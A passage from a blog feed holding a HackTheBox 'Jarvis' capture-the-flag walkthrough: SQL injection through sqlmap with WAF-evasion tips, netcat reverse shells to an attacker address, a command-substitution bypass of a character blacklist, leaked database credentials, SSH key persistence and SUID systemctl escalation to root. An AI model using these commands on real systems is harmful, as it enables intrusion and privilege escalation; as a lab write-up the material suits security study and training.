        <content type="html"><![CDATA[<img width="582" alt="jarvis-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158090-f4010000-9885-11ea-8bb6-383fd343d13c.png"><p>Jarvis was a pretty straight forward box and “textbook case” style. While it’s rated as Medium difficulty I would advise beginners to start with this one.</p><p>It rely on bad configurations practices rather than already made exploits which makes it more interesting in my opinion.</p><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.143 jarvis.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Let’s go !</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC jarvis.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 19:16 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jarvis.htb (10.10.10.143)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Seems like we have somethig super classic: A http (port 80) and SSH (port 22) service open.</p><p>Opening the <code>http://jarvis.htb</code> display the following website :</p><p><img src="https://user-images.githubusercontent.com/9076747/66945555-8cfd3d80-f04f-11e9-9481-4cdf99eadcfa.png" alt="Jarvis website"></p><p>Browsing the site shows available rooms, food and… that’s it. The only page that looks dynamic is the room description page:<br>Let’s keep that in mind.</p><p>Out of curiosity I ran <code>gobuster</code> to see if we can find interresting files and directories but nothing special was found :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://jarvis.htb -w ~/SecLists/Discovery/Web-Content/common.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/fonts (Status: 301)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/phpmyadmin (Status: 301)</span><br></pre></td></tr></table></figure><p>Maybe the <code>phpmyadmin</code> instance will come useful in the future.</p><p>Oddly enough I could run <code>gobuster</code> without issue while during my first walkthrough I got banned when using any automated scanner and got the following message :</p><blockquote><p>Hey you have been banned for 90 seconds, don’t be bad</p></blockquote><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>Since we have no other interesting entry point so far let’s focus on that room page.</p><p>Looking the url <code>http://jarvis.htb/room.php?cod=1</code>, we immediatly notice the <code>cod=1</code> parameter. Let’s try some injection here, starting with the most common: SQL Injection.</p><p>Appending various characters to the <code>cod</code> parameters yield an empty room description :</p><p><img src="https://user-images.githubusercontent.com/9076747/66947239-d56a2a80-f052-11e9-9af5-ff160024847f.png" alt="Jarvis website cod parameter"></p><p>After a few tries we discover that the classical <code>AND 1=1</code> payload works.</p><p>Opening <code>http://jarvis.htb/room.php?cod=1</code> and <code>http://jarvis.htb/room.php?cod=1 AND 1=1</code> return the exact same result :</p><p><img src="https://user-images.githubusercontent.com/9076747/66947449-3691fe00-f053-11e9-8be6-0a53d6269fc0.png" alt="Jarvis website cod parameter injection"></p><p>Let’s automate the process with our favorite SQL injection toolkit: <a href="http://sqlmap.org" target="_blank" rel="noopener">SQLMap</a>.</p><p>A very useful option (in our case) is <code>--os-shell</code>, with it SQLMap will if possible use the SQL injection to upload and open a reverse shell to the server.</p><p>Let’s let SQLMap do all the dirty work for us:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://jarvis.htb/room.php?cod=6"</span> --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">"]_____ ___ ___  &#123;1.3.10#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [.]     | .'| . |</span></span><br><span class="line"><span class="string">|___|_  [']_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[10:56:40] [CRITICAL] page not found (404)</span></span><br><span class="line"><span class="string">[10:56:40] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">404 (Not Found) - 2 times</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:56:40 /2019-10-17/</span></span><br></pre></td></tr></table></figure><p>No surprise, we get banned here with the same error message :</p><blockquote><p>Hey you have been banned for 90 seconds, don’t be bad.</p></blockquote><p>Let’s try different options. First adding a delay of 10 seconds between each request (with <code>--delay=10</code>) might not trigger the ban:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">"http://jarvis.htb/room.php?cod=6"</span> --delay=10 --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.10<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">"]     | .'| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:08] [INFO] heuristic (basic) test shows that GET parameter 'cod' might be injectable</span></span><br><span class="line"><span class="string">[20:02:09] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="</span>high<span class="string">")</span></span><br><span class="line"><span class="string">[20:02:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:35] [INFO] GET parameter 'cod' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable</span></span><br><span class="line"><span class="string">[20:02:37] [INFO] GET parameter 'cod' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: cod (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: cod=6 AND 2304=2304</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: cod=6 AND (SELECT 4682 FROM (SELECT(SLEEP(5)))PeAe)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 7 columns</span></span><br><span class="line"><span class="string">    Payload: cod=-3361 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71767a7071,0x4d496842456c564972414349534c7467674866537166477a644d4f456341536d6453775166635779,0x716b626a71),NULL,NULL,NULL-- VXEr</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[20:02:40] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:41] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[...]</span></span><br><span class="line"><span class="string">[20:02:44] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method</span></span><br><span class="line"><span class="string">[20:02:45] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://jarvis.htb:80/tmpuhbex.php</span></span><br><span class="line"><span class="string">[20:02:45] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://jarvis.htb:80/tmpbmblq.php</span></span><br><span class="line"><span class="string">[20:02:45] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; id</span></span><br><span class="line"><span class="string">command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'</span></span><br></pre></td></tr></table></figure><p>Jackpot!</p><p><em>Note: We could also have used <code>--user-agent=&lt;random-ua&gt;</code> to avoid using the default <code>sqlmap</code> user agent that can get easily detected by WAF.</em></p><p>We have a PHP shell running as www-data.<br>For ease of use, I open a netcat reverse shell and close the php shell opened by SQLMap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="comment"># Back to the SQLMap/PHP reverse shell</span></span><br><span class="line">os-shell&gt; nc -e /bin/sh 10.10.10.10 8585</span><br></pre></td></tr></table></figure><p>And surely we get the connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.143:54336</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Note: As a reminder you can use the following magic trick to upgrade your shell to a fully interactive one :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ <span class="comment"># In Attacker console</span></span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">$ <span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-gt-pepper"><a href="#Pivot-www-data-gt-pepper" class="headerlink" title="Pivot www-data -&gt; pepper"></a>Pivot www-data -&gt; pepper</h3><p>Alright, so now we have shell on the <code>www-data</code> user. Let’s try to move to the user to find the first flag.</p><p>Looking around the webapp files we find the database credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/var/www/html$ cat connection.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$connection</span>=new mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'DBadmin'</span>,<span class="string">'imissyou'</span>,<span class="string">'hotel'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>We can try to connect using the <code>phpmyadmin</code> instance:</p><p><img src="https://user-images.githubusercontent.com/9076747/67007518-e0bb6580-f0e7-11e9-9b1b-f01b364b2926.png" alt="Jarvis phpmyadmin instance"></p><p>But turn out there is nothing interesting there. Only a empty <code>flag</code> database, probably a joke by one of the users. Let’s move on.</p><p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -O lse.sh</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh</span><br><span class="line">2019-10-17 08:00:49 (527 KB/s) - <span class="string">'/tmp/lse.sh'</span> saved [31736/31736]</span><br></pre></td></tr></table></figure><p>Let’s run the script to see if we can find anything intesrresting :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ bash /tmp/lse.sh</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">===================================================================( sudo )=====</span><br><span class="line">[!] sud000 Can we sudo without a password?................................. nope</span><br><span class="line">[!] sud010 Can we list sudo commands without a password?................... yes!</span><br><span class="line">---</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span><br><span class="line">---</span><br><span class="line">============================================================( file system )=====</span><br><span class="line">[!] fst020 Uncommon setuid binaries........................................ yes!</span><br><span class="line">---</span><br><span class="line">/bin/systemctl</span><br><span class="line">---</span><br><span class="line">==================================( FINISHED )==================================</span><br></pre></td></tr></table></figure><p>We notice two very distinctive configurations here. First of all, the script <code>/var/www/Admin-Utilities/simpler.py</code> can be run as user <code>pepper</code> without password through sudo. This <code>simpler.py</code> script will be our entry point to pivot to the <code>pepper</code> user.</p><p>Second, we notice that <code>systemctl</code> binary at the setuid bit set. As a reminder SETUID is special permission attributes in Unix and Unix-like systems, they allow unprivileged users to run programs with elevated privileges.</p><p>Here <code>systemctl</code> will always be run at root:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin/systemctl</span><br><span class="line">-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl</span><br></pre></td></tr></table></figure><p>Let’s keep that in mind for the privilege escalation later.</p><p>Alright, with all of that in mind, let’s investigate this <code>simpler.py</code> script to see how we can abuse it to pivot to the <code>pepper</code> user.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py</span><br></pre></td></tr></table></figure><p>The file is owned by <code>pepper</code> user and we have no right to edit it. We will need to find a vulnerabiility in the script.</p><p>Upon opening it we can see it’s used to show statistics about attackers IP and to ping those IP.</p><p>The function to <code>ping</code> catch the attention because of the use of <code>os.system</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure><p><code>os.system(&#39;ping &#39; + command)</code> clearly open a command injection vulnerability. However the script author seems to be aware of the issue and blacklisted a few common characters used in command injection.</p><p>So we can’t easily inject command. But then what about command substitution ?</p><p>According to the bash manual:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man bash</span><br><span class="line">[...]</span><br><span class="line">Command Substitution</span><br><span class="line">       Command substitution allows the output of a <span class="built_in">command</span> to replace the <span class="built_in">command</span> name.  There are two forms:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              $(<span class="built_in">command</span>)</span><br><span class="line">       or</span><br><span class="line">              `<span class="built_in">command</span>`</span><br></pre></td></tr></table></figure><p> While the <code>`</code> is blacklisted, neither <code>$</code> or <code>()</code> is. Let’s try to subsitate then :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">'_ ` _ \| '</span>_ \| |/ _ \ <span class="string">'__| '</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(id)</span><br><span class="line">ping: groups=1000(pepper): Temporary failure <span class="keyword">in</span> name resolution</span><br></pre></td></tr></table></figure><p> Awseome, let’s use this to open a reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"nc -e /bin/sh 10.10.10.10 8544"</span> &gt; /tmp/hg8.sh</span><br><span class="line">$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">'_ ` _ \| '</span>_ \| |/ _ \ <span class="string">'__| '</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(bash /tmp/hg8.sh)</span><br></pre></td></tr></table></figure><p>And surely enough we get our shell!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line">Connection from 10.10.10.143:57986</span><br><span class="line">pepper@jarvis:~$ id</span><br><span class="line">uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)</span><br><span class="line">pepper@jarvis:~$ cat user.txt</span><br><span class="line">2afxxxxxxxxxxxxxxc44f</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p><em>Note: To make it easier I added my ssh pub key to <code>authorized_keys</code> to connect to the <code>pepper</code> account by SSH:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa XXXXX"</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>The recon phase will be quick here since we already a very valuable information in the user recon phase : <code>/bin/systemctl</code> have the SUID bit set :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin/systemctl</span><br><span class="line">-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl</span><br></pre></td></tr></table></figure><p>This mean that if we manage to make <code>systemctl</code> run a command for us, this one will be automatically run as root user.</p><h3 id="Systemctl-privilege-escalation"><a href="#Systemctl-privilege-escalation" class="headerlink" title="Systemctl privilege escalation"></a>Systemctl privilege escalation</h3><p>For this kind of need, <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> is an incredibly useful project:</p><blockquote><p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p><p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p></blockquote><p>And surely enough, there is informations and even an example for <code>systemctl</code> :</p><blockquote><p>It runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.</p></blockquote><p>First we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Now let’s run the GTFO example and replace the command with our reverse shell :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ TF=$(mktemp).service</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">'[Service]</span></span><br><span class="line"><span class="string">Type=oneshot</span></span><br><span class="line"><span class="string">ExecStart=/bin/sh -c "nc 10.10.10.10 8585 -e /bin/bash"</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target'</span> &gt; <span class="variable">$TF</span></span><br><span class="line">[hg8@archbook ~]$ systemctl link <span class="variable">$TF</span></span><br><span class="line">[hg8@archbook ~]$ systemctl <span class="built_in">enable</span> --now <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p>And since everything went fine, we get our shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.143:35734</span><br><span class="line"></span><br><span class="line">root@jarvis:/<span class="comment">#</span></span><br><span class="line">root@jarvis:/<span class="comment"># cat /root/root.txt</span></span><br><span class="line">d41dxxxxxxxxxxxxxxx71</span><br></pre></td></tr></table></figure><p>Hope this was clear enough, as always do not hesitate to contact me for any questions or feedbacks.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
            <tag> gobuster </tag>
            
            <tag> jarvis </tag>
            
            <tag> waf </tag>
            
            <tag> sql-injection </tag>
            
            <tag> sqlmap </tag>
            
            <tag> phpmyadmin </tag>
            
            <tag> cve-2018-12613 </tag>
            
            <tag> systemctl </tag>
            
            <tag> service </tag>
            
            <tag> gtfobins </tag>
            
            <tag> command-injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Haystack</title>
      <link href="/posts/haystack/"/>
      <url>/posts/haystack/</url>
      
